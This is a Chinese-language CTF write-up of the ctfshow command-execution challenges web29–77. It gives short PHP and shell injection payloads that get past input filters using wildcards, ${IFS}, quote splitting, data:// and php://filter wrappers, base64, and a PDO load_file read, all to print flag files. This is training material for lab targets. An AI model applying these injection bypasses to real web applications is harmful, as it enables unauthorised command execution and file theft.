---
layout: post
title: ctfshow-命令执行wp
date: 2021-02-05
tags: ["web"]
---

[toc]

## web29

通配符绕过

    ?c=system("tac fla*");

## web30

过滤system，用exec()

    ?c=echo exec("cat fla*");

## web31

过滤空格，%09绕过

    ?c=passthru("tac%09fla*");

## web32-36

过滤分号。
include可以不用括号，然后末尾用?>截断

    ?c=include$_GET["fx"]?>&fx=php://filter/read=convert.base64-encode/resource=flag.php

## web37

包含文件，过滤flag.用文件流读取。

    c=data://text/plain,<?php system("cat fla*");?>

## web38

过滤php，base64一下

    c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

## web39

后面字符串组装.php，但是问题不大，data流读取的时候php语句已经执行完了。

    c=data://text/plain,<?php system("cat fla*");?>

## web40

过滤的是中文括号。。。。

    c=show_source(next(array_reverse(scandir(pos(localeconv())))));

## web41

https://blog.csdn.net/miuzzx/article/details/108569080

## web42

会重定向把结果丢弃，可以截断。
'只执行前面，''只执行后面。
也可以用%0a截断。

    c=cat flag.php''

## web43

过滤了cat，相当于没过滤

    c=tac flag.php''

## web44

在43基础上过滤了flag，相当于没过滤。

    c=tac fla*''

## web45

在44基础上过滤了空格，相当于没过滤。

    c=tac${IFS}fla*''

## web46

在45基础上过滤了$符号，用<代替空格。
值得注意的是<和通配符&#42;不能一起使用。

    c=tac<fla''g.php''

## web47

多过滤了一些命令，但是tac仍然可以使用。同上题payload

## web48

同上题

## web49

同上题

## web50

同上题

## web51

过滤tac，换成nl

    c=nl<fl''ag.php''

## web52

迷惑，过滤<又不过滤$了。

    c=nl${IFS}fla''g.php''

## web53

注意这个题不需要截断了。

    c=nl${IFS}fla''g.php

## web54

过滤了命令中间插入符号的形式，用通配符，还有&#42;被过滤了所以用?。

    c=/bin/ca?${IFS}f???????

## web55-56

移步[p神博客](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

## web57

过滤了很多，但是美元号和&#40;、)是没有过滤的
说实话俺很难看出来，但是题目也提示了flag是在36.php，是纯数字的，所以想到用$和()来构造数字。

    //看这个计算方法的时候，把上一行的整体带到下一行去看。
    echo $(()) // 结果是0
    echo $((~$(()))) //结果是-1 
    echo $(($((~$(())))$((~$(()))))) //结果是-2
    //然后又有：
    echo $((~-37)) //结果是36

就可以得到payload：

    $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))

## web58

从这里开始，有的函数被ban了不能使用，比如这道题执行命令的所有函数都是不能用的。
查看路径：

    print_r(scandir(dirname(__file__)));

查看flag:

    print_r(file('flag.php'));

## web59

同上题

## web60

过滤了file函数，所以没办法像刚刚那样读。
学了个新姿势，多写几行php就行

    c=$a=fopen('flag.php','r');while(!feof($a)){$line=fgetc($a);print_r($line);}

## web61-65

fgetc过滤了。
扫描目录：

    c=$a=opendir('./');while(($file=readdir($a))!=false){print_r($file."、");}

扫出来之后查看flag，这里show_source和highlight_file都没有过滤：

    show_source('flag.php');
    highlight_file('flag.php');

## web66

和上面一样做法的时候，发现flag并不在flag.php里面。
所以用上面的方法扫了目录。发现根目录下面有个flag.txt。
然后：

    c=highlight_file('../../../flag.txt');

得到flag.

## web67

和上面的区别是过滤了print_r
换成echo之后做法一样

## web68

highlight_file()方法被禁用了。
换成include/require/require_once,没有什么变化

## web69

学了个其他扫目录的新姿势：

    c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo $f->__tostring()." 、";}

假如扫目标目录，把glob:///&#42;换掉换成目标目录即可，比如扫根目录下的bin就是换成/bin

## web70

同上题

## web71

先代码审计
[![](http://ltfa1l.top/wp-content/uploads/2021/01/wp_editor_md_9005b2eefb0dfa6732c1687d7b54332b.jpg)](wp_editor_md_9005b2eefb0dfa6732c1687d7b54332b.jpg)
查一下ob_get_contents()，它会获得缓冲区的输出但是不输出，然后缓冲区被清除，上面获得的缓冲区的又被正则给替换了。
做法同上题，不过payload后面exit()即可。

## web72

谢谢，我跳过了

## web73

我晕，73比72简单多了
扫目录发现是在根目录下的flagc.txt
include包含即可

## web74

同73

## web75

仍然可以用上面的方法得知flag是在根目录下的flag36.txt，用include来读取，发现这个目录不允许读取。
所以只好用mysql的load_file方法来读取。
要使用这个方法，需要建立mysql连接。尝试了一下，只能建立pdo连接才可以读取。
payload:

    c=try{$pdo=new pdo("mysql:host=localhost;dbname=ctftraining","root","root");}catch(PDDException $e){echo"数据库连接错误";}foreach($pdo->query("select load_file('/flag36.txt')") as $row){echo $row[0]."、";}echo"数据库连接成功";exit();

## web76

同上

## web77及以后

暂时真不会，886